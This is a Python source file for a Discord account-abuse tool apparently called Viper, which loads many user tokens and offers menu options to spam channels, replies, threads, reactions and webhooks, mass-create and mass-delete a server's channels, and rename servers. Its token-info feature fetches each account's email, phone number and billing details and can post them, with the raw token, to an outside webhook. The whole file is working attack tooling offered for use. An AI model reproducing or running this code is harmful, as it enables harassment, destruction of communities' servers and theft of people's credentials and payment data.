# ~ IMPORTS ~
import requests
import asyncio
import os
import json
import random
import aiohttp
import sys
from pystyle import Colors, Colorate
import aiofiles
from concurrent.futures import ThreadPoolExecutor
import tls_client
import time
import base64


w = Colors.white
g = Colors.green
r = Colors.reset

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def tkn():
    try:
        with open('tokens.txt', 'r') as file:
            tokens = file.readlines()
        return len([token.strip() for token in tokens if token.strip()])
    except FileNotFoundError:
        return 0

async def logo():
    token_count = tkn()
    logo_art = f"""
                                            ___    ______
                                            __ |  / /__(_)____________________
                                            __ | / /__  /___  __ \  _ \_  ___/
                                            __ |/ / _  / __  /_/ /  __/  /     [{token_count}] tokens
                                            _____/  /_/  _  .___/\___//_/      [!] discord.gg/ipesp
                                                        /_/
    """
    logo_color = Colorate.Vertical(Colors.green_to_cyan, logo_art)
    print(logo_color)

async def menu():
    while True:
        clear()
        await logo()
        menu_options = f"""
                                {g}[{w}01{g}]{w} ➜ token checker     {g}[{w}06{g}]{w} ➜ thread spammer     {g}[{w}11{g}]{w} ➜ server changer
                                {g}[{w}02{g}]{w} ➜ token info        {g}[{w}07{g}]{w} ➜ reply spammer      
                                {g}[{w}03{g}]{w} ➜ token onliner     {g}[{w}08{g}]{w} ➜ create channels    
                                {g}[{w}04{g}]{w} ➜ channel spammer   {g}[{w}09{g}]{w} ➜ delete channels
                                {g}[{w}05{g}]{w} ➜ reaction spammer  {g}[{w}10{g}]{w} ➜ webhook spammer
        """
        print(menu_options)
        choice = await asyncio.get_event_loop().run_in_executor(None, input, Colorate.Horizontal(Colors.green_to_cyan, "            Choice ➜  "))

        if choice == '1':
            await check_tokens()
        elif choice == '2':
            await token_info()
        elif choice == '3':
            await token_onliner()
        elif choice == '4':
            await channel_spammer()
        elif choice == '5':
            await reaction_spammer()
        elif choice == '6':
            await thread_spammer()  
        elif choice == '7':
            await reply_spammer()
        elif choice == '8':
            await create_channels()  
        elif choice == '9':
            await delete_channels() 
        elif choice == '10':
            await webhook_spammer()
        elif choice == '11':
            await server_changer()                     
        else:
            print(Colorate.Horizontal(Colors.red_to_white, "[!] Invalid choice."))
        await asyncio.get_event_loop().run_in_executor(None, input, Colorate.Horizontal(Colors.green_to_cyan, "Press Enter to return to the menu"))

async def server_changer():
    with open('tokens.txt') as f:
        tokens = f.read().splitlines()

    if not tokens:
        print(Colorate.Horizontal(Colors.red_to_white, "[-] No tokens found in 'tokens.txt'."))
        return

    server_id = input(Colorate.Horizontal(Colors.green_to_cyan, "[?] Enter the server ID (guild ID): "))
    new_name = input(Colorate.Horizontal(Colors.green_to_cyan, "[?] Enter the new server name: "))
    image_url = input(Colorate.Horizontal(Colors.green_to_cyan, "[?] Enter the URL to the new icon image (or leave blank for no change): "))

    if image_url.strip() == "":
        image_url = None

    client = tls_client.Session()

    headers = {
        'Content-Type': 'application/json'
    }

    url = f"https://discord.com/api/v10/guilds/{server_id}"

    encoded_icon = None
    if image_url:
        response = requests.get(image_url)
        if response.status_code == 200:
            encoded_icon = "data:image/png;base64," + base64.b64encode(response.content).decode("utf-8")
        else:
            print(Colorate.Horizontal(Colors.red_to_white, f"[-] Failed to fetch image from URL. Status code: {response.status_code}"))
            return

    data = {
        "name": new_name,
        "icon": encoded_icon
    }

    try:
        for i, token in enumerate(tokens):
            headers['Authorization'] = f"{token}"  

            response = client.patch(url, headers=headers, json=data)

            if response.status_code == 200:
                print(Colorate.Horizontal(Colors.green_to_white, f"[+] Successfully updated server info with token {i + 1}."))
            else:
                print(Colorate.Horizontal(Colors.red_to_white, f"[-] Failed to update server info with token {i + 1}: {response.text}"))

    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_white, f"[-] Error while updating server info: {e}"))

async def webhook_spammer():
    tokens = []
    with open('tokens.txt') as f:
        tokens = f.read().splitlines()

    if not tokens:
        print(Colorate.Horizontal(Colors.red_to_white, "[-] No tokens found in 'tokens.txt'."))
        return

    guild_id = input(Colorate.Horizontal(Colors.green_to_cyan, "[?] Enter your Server (Guild) ID: "))
    webhook_name = input(Colorate.Horizontal(Colors.green_to_cyan, "[?] Enter the webhook name: "))
    message_content = input(Colorate.Horizontal(Colors.green_to_cyan, "[?] Enter the message content to spam: "))
    num_messages = int(input(Colorate.Horizontal(Colors.green_to_cyan, "[?] Enter the number of messages to send repeatedly: ")))

    async def create_webhook(token, channel_id):
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json'
        }
        data = {"name": webhook_name}
        response = requests.post(f"https://discord.com/api/v10/channels/{channel_id}/webhooks", headers=headers, json=data)
        if response.status_code == 200:
            webhook = response.json()
            print(Colorate.Horizontal(Colors.green_to_white, f"[+] Webhook created: {webhook['name']} ({webhook['url']}) in channel {channel_id}."))
            return webhook['url']
        else:
            print(Colorate.Horizontal(Colors.red_to_white, f"[-] Failed to create webhook in channel {channel_id}: {response.text}"))
            return None

    async def send_webhook_message(webhook_url):
        headers = {'Content-Type': 'application/json'}
        data = {'content': message_content}
        response = requests.post(webhook_url, headers=headers, json=data)
        if response.status_code == 204:
            print(Colorate.Horizontal(Colors.green_to_white, f"[+] Message sent successfully via {webhook_url}."))
        else:
            print(Colorate.Horizontal(Colors.red_to_white, f"[-] Failed to send message: {response.text}"))

    async def get_guild_channels(token):
        headers = {'Authorization': token}
        response = requests.get(f"https://discord.com/api/v10/guilds/{guild_id}/channels", headers=headers)
        if response.status_code == 200:
            return response.json()
        else:
            print(Colorate.Horizontal(Colors.red_to_white, f"[-] Failed to fetch channels: {response.text}"))
            return []

    webhook_urls = []
    
    for token in tokens:
        print(Colorate.Horizontal(Colors.green_to_white, f"[*] Using token: {token[:10]}..."))
        channels = await get_guild_channels(token)
        for channel in channels:
            if channel['type'] == 0:  # Only text channels
                webhook_url = await create_webhook(token, channel['id'])
                if webhook_url:
                    webhook_urls.append(webhook_url)

    start_time = time.time()
    tasks = [send_webhook_message(webhook_url) for webhook_url in webhook_urls for _ in range(num_messages)]
    await asyncio.gather(*tasks)
    end_time = time.time()

    print(Colorate.Horizontal(Colors.green_to_white, f"[+] Spam Complete - {num_messages} messages sent via webhooks - Total Time taken: {end_time - start_time:.2f} seconds"))

async def delete_channels():
    client = tls_client.Session()

    with open('tokens.txt') as f:
        tokens = f.read().splitlines()

    if not tokens:
        print(Colorate.Horizontal(Colors.red_to_white, "[-] No tokens found in 'tokens.txt'."))
        return

    guild_id = input(Colorate.Horizontal(Colors.green_to_cyan, "[?] Enter the guild (server) ID: "))
    
    headers_template = {'Content-Type': 'application/json'}
    headers_template['Authorization'] = tokens[0]  # Using the first token to fetch the channels

    url = f"https://discord.com/api/v10/guilds/{guild_id}/channels"

    response = client.get(url, headers=headers_template)
    if response.status_code != 200:
        print(Colorate.Horizontal(Colors.red_to_white, f"[-] Failed to fetch channels: {response.text}"))
        return

    channels = response.json() 
    if not channels:
        print(Colorate.Horizontal(Colors.red_to_white, "[-] No channels found in the server."))
        return

    channel_ids = [channel['id'] for channel in channels]  
    
    async def delete_channel(token, channel_id, index):
        headers = headers_template.copy()
        headers['Authorization'] = token

        url_delete = f"https://discord.com/api/v10/channels/{channel_id}"
        response_delete = client.delete(url_delete, headers=headers)
        
        if response_delete.status_code == 200:
            print(Colorate.Horizontal(Colors.green_to_white, f"[+] Channel {channel_id} deleted successfully using token {index % len(tokens) + 1}."))
        else:
            print(Colorate.Horizontal(Colors.red_to_white, f"[-] Failed to delete channel {channel_id} with token {index % len(tokens) + 1}: {response_delete.text}"))

    tasks = []
    for i, channel_id in enumerate(channel_ids):
        token = tokens[i % len(tokens)]
        task = delete_channel(token, channel_id, i)
        tasks.append(task)

    await asyncio.gather(*tasks)

async def create_channels():
    client = tls_client.Session()

    with open('tokens.txt') as f:
        tokens = f.read().splitlines()

    if not tokens:
        print(Colorate.Horizontal(Colors.red_to_white, "[-] No tokens found in 'tokens.txt'."))
        return

    guild_id = input(Colorate.Horizontal(Colors.green_to_cyan, "[?] Enter the guild (server) ID: "))
    num_channels = int(input(Colorate.Horizontal(Colors.green_to_cyan, "[?] Enter the number of channels to create: ")))
    channel_name = input(Colorate.Horizontal(Colors.green_to_cyan, "[?] Enter the channel base name: "))
    
    headers_template = {'Content-Type': 'application/json'}
    url = f"https://discord.com/api/v10/guilds/{guild_id}/channels"
    
    data_template = {
        "type": 0,  # Type 0 is for text channels
        "permission_overwrites": []
    }

    async def create_channel(token, channel_base_name, index):
        headers = headers_template.copy()
        headers['Authorization'] = token

        data = data_template.copy()
        data["name"] = f"{channel_base_name} #{index+1}"

        response = client.post(url, headers=headers, json=data)
        if response.status_code == 201:
            print(Colorate.Horizontal(Colors.green_to_white, f"[+] Channel '{data['name']}' created successfully using token {index % len(tokens) + 1}."))
        else:
            print(Colorate.Horizontal(Colors.red_to_white, f"[-] Failed to create channel '{data['name']}' with token {index % len(tokens) + 1}: {response.text}"))

    tasks = []
    for i in range(num_channels):
        token = tokens[i % len(tokens)]
        task = create_channel(token, channel_name, i)
        tasks.append(task)

    await asyncio.gather(*tasks)

async def reply_spammer():
    client = tls_client.Session()
    
    with open('tokens.txt') as f:
        tokens = f.read().splitlines()

    if not tokens:
        print(Colorate.Horizontal(Colors.red_to_white, "[-] No tokens found in 'tokens.txt'."))
        return

    num_replies = int(input(Colorate.Horizontal(Colors.green_to_cyan, "[?] Enter the number of replies to send: ")))
    reply_content = input(Colorate.Horizontal(Colors.green_to_cyan, "[?] Enter the reply message content: "))
    message_id = input(Colorate.Horizontal(Colors.green_to_cyan, "[?] Enter the ID of the message to reply to: "))
    channel_id = input(Colorate.Horizontal(Colors.green_to_cyan, "[?] Enter the ID of the channel: "))
    
    headers_template = {'Content-Type': 'application/json'}
    url = f"https://discord.com/api/v10/channels/{channel_id}/messages"
    data = {"content": reply_content, "message_reference": {"message_id": message_id}}

    try:
        for i in range(num_replies):
            headers = headers_template.copy()
            headers['Authorization'] = tokens[i % len(tokens)]
            
            response = client.post(url, headers=headers, json=data)
            if response.status_code == 200:
                print(Colorate.Horizontal(Colors.green_to_white, f"[+] Reply {i+1} sent successfully using token {i % len(tokens) + 1}: {reply_content}"))
            else:
                print(Colorate.Horizontal(Colors.red_to_white, f"[-] Failed to send reply {i+1} using token {i % len(tokens) + 1}: {response.text}"))

    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_white, f"[-] Error while sending replies: {e}"))

async def thread_spammer():
    client = tls_client.Session()
    
    with open('tokens.txt') as f:
        tokens = f.read().splitlines()

    if not tokens:
        print(Colorate.Horizontal(Colors.red_to_white, "[-] No tokens found in 'tokens.txt'."))
        return

    channel_id = input(Colorate.Horizontal(Colors.green_to_cyan, "[?] Enter the channel ID: "))
    num_threads = int(input(Colorate.Horizontal(Colors.green_to_cyan, "[?] Enter the number of threads to create: ")))
    thread_name = input(Colorate.Horizontal(Colors.green_to_cyan, "[?] Enter the base name for the threads: "))
    message_content = input(Colorate.Horizontal(Colors.green_to_cyan, "[?] Enter the message content for the threads: "))
    delay = float(input(Colorate.Horizontal(Colors.green_to_cyan, "[?] Enter the delay between requests (seconds): ")))

    headers_template = {'Content-Type': 'application/json'}
    
    async def create_thread_with_message(token, token_index, thread_name, message_content):
        headers = headers_template.copy()
        headers['Authorization'] = token
        
        for i in range(num_threads):
            url_create_thread = f"https://discord.com/api/v10/channels/{channel_id}/threads"
            thread_data = {"name": f"{thread_name} #{i+1}", "auto_archive_duration": 1440, "type": 11}
            try:
                response_create_thread = await asyncio.to_thread(client.post, url_create_thread, headers=headers, json=thread_data)
                
                if response_create_thread.status_code == 429:
                    retry_after = json.loads(response_create_thread.text).get('retry_after', 1)
                    print(Colorate.Horizontal(Colors.red_to_white, f"[-] Rate limited. Retrying after {retry_after} seconds..."))
                    await asyncio.sleep(retry_after)
                    return await create_thread_with_message(token, token_index, thread_name, message_content)
                
                if response_create_thread.status_code == 201:
                    thread_id = json.loads(response_create_thread.text)['id']
                    print(Colorate.Horizontal(Colors.green_to_white, f"[+] Thread '{thread_name} #{i+1}' created successfully with token {token_index + 1}."))
                    
                    url_send_message = f"https://discord.com/api/v10/channels/{thread_id}/messages"
                    msg_data = {"content": message_content}
                    response_send_message = await asyncio.to_thread(client.post, url_send_message, headers=headers, json=msg_data)
                    
                    if response_send_message.status_code in [200, 201]:
                        print(Colorate.Horizontal(Colors.green_to_white, f"[+] Message sent in '{thread_name} #{i+1}' successfully with token {token_index + 1}."))
                    else:
                        print(Colorate.Horizontal(Colors.red_to_white, f"[-] Failed to send message in thread '{thread_name} #{i+1}' with token {token_index + 1}: {response_send_message.text}"))
                else:
                    print(Colorate.Horizontal(Colors.red_to_white, f"[-] Failed to create thread '{thread_name} #{i+1}' with token {token_index + 1}: {response_create_thread.text}"))
                
                await asyncio.sleep(delay)
                
            except Exception as e:
                print(Colorate.Horizontal(Colors.red_to_white, f"[-] Error creating thread '{thread_name} #{i+1}' with token {token_index + 1}: {e}"))

    tasks = []
    for token_index, token in enumerate(tokens):
        task = create_thread_with_message(token, token_index, thread_name, message_content)
        tasks.append(task)

    start_time_total = time.time()
    await asyncio.gather(*tasks)
    end_time_total = time.time()

    print(Colorate.Horizontal(Colors.green_to_white, f"[+] Successfully created {num_threads} threads in the channel - Total Time taken: {end_time_total - start_time_total:.2f} seconds")) 


async def reaction_spammer():
    message_id = input(Colorate.Horizontal(Colors.green_to_cyan, "[?] Enter the message ID to spam: "))
    channel_id = input(Colorate.Horizontal(Colors.green_to_cyan, "[?] Enter the channel ID: "))

    with open('tokens.txt', 'r') as f:
        tokens = [line.strip() for line in f]

    emojis = [
        '😀', '😂', '😍', '🥺', '😎', '🤯', '🔥', '💯', '💀', '👀',
        '🤖', '🎉', '💥', '😈', '😱', '🙌', '💪', '🙏', '👏', '🤝'
    ]

    headers_template = {
        'Authorization': '',
        'Content-Type': 'application/json'
    }

    def send_reaction(token, emoji):
        headers = headers_template.copy()
        headers['Authorization'] = token

        url = f'https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}/reactions/{emoji}/%40me'
        try:
            response = requests.put(url, headers=headers)
            if response.status_code == 204:
                print(Colorate.Horizontal(Colors.green_to_white, f"[+] Reacted with {emoji}"))
            else:
                print(Colorate.Horizontal(Colors.red_to_white, f"[-] Failed to react with {emoji}, status code: {response.status_code}"))
        except Exception as e:
            print(Colorate.Horizontal(Colors.red_to_white, f"[-] Error reacting with {emoji}: {e}"))

    def worker(token):
        for emoji in emojis:
            send_reaction(token, emoji)

    with ThreadPoolExecutor() as executor:
        futures = [executor.submit(worker, token) for token in tokens]
        for future in futures:
            future.result()

async def channel_spammer():
    CHANNEL_ID = input(Colorate.Horizontal(Colors.green_to_cyan, "[?] Enter your channel ID: "))
    MESSAGES = input(Colorate.Horizontal(Colors.green_to_cyan, "[?] Enter your message to spam: "))
    MESSAGE_COUNT = int(input(Colorate.Horizontal(Colors.green_to_cyan, "[?] Enter how many messages: ")))

    async with aiofiles.open('tokens.txt', 'r') as file:
        tokens = [line.strip() for line in await file.readlines() if line.strip()]

    async def send_message(token):
        url = f"https://discord.com/api/v9/channels/{CHANNEL_ID}/messages"
        headers = {'Authorization': token}
        async with aiohttp.ClientSession() as session:
            for _ in range(MESSAGE_COUNT):
                for message in MESSAGES.split('\n'):
                    data = {'content': message}
                    async with session.post(url, json=data, headers=headers) as response:
                        if response.status == 200:
                            print(Colorate.Horizontal(Colors.green_to_white, f'[+] Message sent with token {token} to channel {CHANNEL_ID}'))
                        elif response.status == 403:
                            print(Colorate.Horizontal(Colors.red_to_white, f'[-] Forbidden: Token {token} might have insufficient permissions or is invalid.'))
                        else:
                            print(Colorate.Horizontal(Colors.red_to_white, f'[-] Failed to send message with token {token}. Status code: {response.status}'))

    tasks = [send_message(token) for token in tokens]
    await asyncio.gather(*tasks)

async def token_onliner():
    GAME = "Ipesp on top"
    type_ = 0
    random_ = True
    stream_text = "Ipesp on top"

    with open("tokens.txt", "r") as f:
        tokens = f.read().splitlines()

    if not tokens:
        print(Colorate.Horizontal(Colors.red_to_white, "[!] No tokens found in tokens.txt"))
        return

    print(Colorate.Horizontal(Colors.green_to_white, f"[i] {len(tokens)} tokens found in tokens.txt"))
    print("[i] Starting...")

    async def update_status(token):
        headers = {"Authorization": token}
        async with aiohttp.ClientSession() as session:
            async with session.ws_connect('wss://gateway.discord.gg/?v=10&encoding=json') as ws:
                hello = await ws.receive_json()
                heartbeat_interval = hello['d']['heartbeat_interval']

                if random_:
                    type_ = random.choice(['Playing', 'Streaming', 'Watching', 'Listening', ''])
                    status = random.choice(['online', 'dnd', 'idle'])
                    if type_ == "Playing":
                        game = random.choice(["Minecraft", "Badlion", "Roblox", "The Elder Scrolls: Online"])
                        gamejson = {"name": game, "type": 0}
                    elif type_ == 'Streaming':
                        gamejson = {"name": GAME, "type": 1, "url": stream_text}
                    elif type_ == "Listening":
                        game = random.choice(["Spotify", "Deezer", "Apple Music", "YouTube"])
                        gamejson = {"name": game, "type": 2}
                    elif type_ == "Watching":
                        game = random.choice(["YouTube", "Twitch"])
                        gamejson = {"name": game, "type": 3}
                    else:
                        gamejson = {"name": GAME, "type": 0}
                else:
                    gamejson = {"name": GAME, "type": 0}

                auth = {
                    "op": 2,
                    "d": {
                        "token": token,
                        "properties": {
                            "$os": sys.platform,
                            "$browser": "RTB",
                            "$device": f"{sys.platform} Device"
                        },
                        "presence": {
                            "game": gamejson,
                            "status": 'online',
                            "since": 0,
                            "afk": False
                        }
                    },
                    "s": None,
                    "t": None
                }
                await ws.send_json(auth)
                ack = {"op": 1, "d": None}
                while True:
                    try:
                        await asyncio.sleep(heartbeat_interval / 1000)
                        print(Colorate.Horizontal(Colors.green_to_white, f"[i] Token {token} is online"))
                        await ws.send_json(ack)
                    except Exception as e:
                        print(Colorate.Horizontal(Colors.red_to_white, f"[!] Error: {e}"))
                        break

    tasks = [update_status(token) for token in tokens]
    await asyncio.gather(*tasks)

def send_to_webhook(webhook_url, embed):
    data = {"embeds": [embed]}
    response = requests.post(webhook_url, json=data)
    if response.status_code == 204:
        print(Colorate.Horizontal(Colors.green_to_white, "Message successfully sent to the webhook."))
    else:
        print(Colorate.Horizontal(Colors.red_to_white, f"Failed to send message to webhook. Status Code: {response.status_code}"))
        print(Colorate.Horizontal(Colors.red_to_white, f"Response Content: {response.text}"))

def create_embed(token, user_info, billing_info, nitro_info):
    avatar_url = f"https://cdn.discordapp.com/avatars/{user_info.get('id')}/{user_info.get('avatar')}.png?size=128" if user_info.get('avatar') else None

    if not isinstance(billing_info, list):
        billing_info = []

    formatted_billing_info = "\n".join(
        f"💳 **Type:** `{source.get('type', 'Unknown')}`\n"
        f"🔢 **Last 4 Digits:** `{source.get('last_4', 'N/A')}`\n"
        f"📅 **Expires:** `{source.get('expires_at', 'N/A')}`\n"
        f"🏠 **Billing Address:** `{source.get('billing_address', 'N/A')}`\n"
        f"🌍 **Country:** `{source.get('country', 'N/A')}`"
        for source in billing_info if isinstance(source, dict)
    ) if billing_info else "No billing info available"

    nitro_status = "Nitro" if nitro_info.get('nitro') else "No Nitro"
    nitro_details = (
        f"🎁 **Nitro Type:** `{nitro_info.get('type', 'N/A')}`\n"
    ) if nitro_info else "No Nitro details available"

    embed = {
        "title": "🕵️ User Information",
        "description": f"**Details for token:** `{token}`\n\n"
                        f"**Nitro Status:** {nitro_status}",
        "color": 0x000000,
        "thumbnail": {
            "url": avatar_url
        },
        "fields": [
            {"name": "💬 ID", "value": f'`{user_info.get("id", "N/A")}`', "inline": True},
            {"name": "👤 Username", "value": f'`{user_info.get("username", "N/A")}`', "inline": True},
            {"name": "🖋 Display Name", "value": f'`{user_info.get("global_name", "N/A")}`', "inline": True},
            {"name": "📧 Email", "value": f'`{user_info.get("email", "N/A")}`', "inline": True},
            {"name": "📞 Phone Number", "value": f'`{user_info.get("phone", "N/A")}`', "inline": True},
            {"name": "💳 Billing Info", "value": formatted_billing_info, "inline": False},
            {"name": "✨ Nitro Details", "value": nitro_details, "inline": False}
        ],
        "footer": {
            "text": "Generated by Viper"  
        }
    }
    return embed

async def token_info():
    choice = input(Colorate.Horizontal(Colors.green_to_white, "[?] Do you want to [P]rint or send via [W]ebhook? ")).lower()

    if choice == 'w':
        webhook_url = input(Colorate.Horizontal(Colors.green_to_white, "[?] Enter the webhook URL: "))

    try:
        with open('tokens.txt', 'r') as file:
            tokens = [token.strip() for token in file.readlines() if token.strip()]

        for token in tokens:
            url = "https://discord.com/api/v9/users/@me"
            headers = {"Authorization": token}

            response = requests.get(url, headers=headers)
            if response.status_code == 200:
                user_data = response.json()

                billing_url = "https://discord.com/api/v9/users/@me/billing/payment-sources"
                billing_response = requests.get(billing_url, headers=headers)

                if billing_response.status_code == 200:
                    billing_data = billing_response.json()
                    billing_info = [source for source in billing_data]
                else:
                    billing_info = ["Billing info unavailable"]

                nitro_info = {
                    "nitro": user_data.get("premium_type") is not None,
                    "type": user_data.get("premium_type", "N/A"),
                }

                user_info = {
                    "id": user_data.get("id"),
                    "username": f'{user_data.get("username")}#{user_data.get("discriminator")}',
                    "global_name": user_data.get("global_name", "Not Set"),
                    "email": user_data.get("email", "No email linked"),
                    "phone": user_data.get("phone", "No phone linked"),
                    "avatar": user_data.get("avatar")
                }

                embed = create_embed(token, user_info, billing_info, nitro_info)

                if choice == 'p':
                    print(Colorate.Horizontal(Colors.green_to_white, f"User Info for Token: `{token}`"))
                    for field in embed["fields"]:
                        print(f"{field['name']}: {field['value']}")
                    print("\n")
                elif choice == 'w':
                    send_to_webhook(webhook_url, embed)

            else:
                error_message = Colorate.Horizontal(Colors.red_to_white, f"Invalid token or unable to fetch user info for token `{token}`. Status Code: {response.status_code}\n")
                if choice == 'p':
                    print(error_message)
                elif choice == 'w':
                    send_to_webhook(webhook_url, {"title": "Error", "description": error_message, "color": 15158332})

    except FileNotFoundError:
        print(Colorate.Horizontal(Colors.red_to_white, "tokens.txt file not found."))

async def check_tokens():
    try:
        async with aiofiles.open('tokens.txt', 'r') as file:
            tokens = [line.strip() for line in await file.readlines() if line.strip()]

        async def check_token(token):
            url = "https://discord.com/api/v9/users/@me"
            headers = {"Authorization": token}
            async with aiohttp.ClientSession() as session:
                async with session.get(url, headers=headers) as response:
                    if response.status == 200:
                        print(Colorate.Horizontal(Colors.green_to_white, f"[+] Token {token} is valid"))
                    else:
                        print(Colorate.Horizontal(Colors.red_to_white, f"[-] Token {token} is invalid"))

        tasks = [check_token(token) for token in tokens]
        await asyncio.gather(*tasks)

    except FileNotFoundError:
        print(Colorate.Horizontal(Colors.red_to_white, "tokens.txt file not found"))


if __name__ == "__main__":
    asyncio.run(menu())
